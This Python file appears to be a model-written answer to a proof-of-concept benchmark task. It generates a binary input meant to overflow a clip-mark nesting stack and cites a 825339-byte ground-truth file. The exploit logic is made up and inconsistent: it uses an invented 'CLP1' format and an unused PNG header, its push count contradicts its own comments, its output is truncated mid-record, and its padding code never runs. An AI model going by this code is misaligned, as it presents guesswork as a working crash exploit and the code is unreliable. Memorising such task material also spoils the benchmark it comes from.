import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on vulnerability: nesting depth not checked before pushing clip mark
        # The file format appears to have clip marks with nesting capability
        # We'll create a deeply nested structure to overflow the clip/layer stack
        
        # Header bytes (typical for many binary formats)
        header = b"\x89PNG\r\n\x1a\n"  # PNG-like header but we'll create custom format
        
        # Create a simple file format with nested clip operations
        # Format: [type:1][length:4][data:length] where type=1 is push_clip
        
        poc = bytearray()
        
        # File signature/header
        poc.extend(b"CLP1")  # Custom format signature
        
        # Add initial setup
        poc.extend(b"\x00\x00\x00\x00")  # Version
        poc.extend(b"\x00\x00\x00\x01")  # Initial layer
        
        # The vulnerability triggers when pushing too many clip marks
        # We need enough pushes to overflow the fixed-size stack
        # Ground truth is 825339 bytes, but we can create shorter
        
        # We'll create a more efficient representation:
        # Each push operation: [opcode=0x01][layer_id][data_size][data]
        # We'll use minimal data to keep size down
        
        push_count = 16384  # Enough to overflow typical fixed buffers
        if push_count * 8 < 825339:  # Ensure we're shorter than ground truth
            push_count = 825339 // 8
        
        # Add push operations
        for i in range(push_count):
            # Push clip mark operation
            poc.extend(b"\x01")  # Opcode for push_clip
            poc.extend(struct.pack("<I", i % 256))  # Layer ID
            poc.extend(struct.pack("<I", 1))  # Minimal data size
            poc.extend(b"\x00")  # Minimal data
            
        # Add some legitimate operations to make file look valid
        poc.extend(b"\x02")  # Draw operation
        poc.extend(struct.pack("<I", 0))
        poc.extend(struct.pack("<I", 4))
        poc.extend(b"TEST")
        
        # Final end marker
        poc.extend(b"\xFF\xFF\xFF\xFF")
        
        # Ensure we have enough bytes to trigger the vulnerability
        # but keep it significantly shorter than ground truth
        target_length = min(len(poc), 100000)  # Aim for ~100KB
        
        if len(poc) < target_length:
            # Pad with valid but harmless operations
            while len(poc) < target_length:
                poc.extend(b"\x03")  # NOP operation
                poc.extend(struct.pack("<I", 0))
                poc.extend(b"\x00\x00\x00\x00")
        
        return bytes(poc[:target_length])
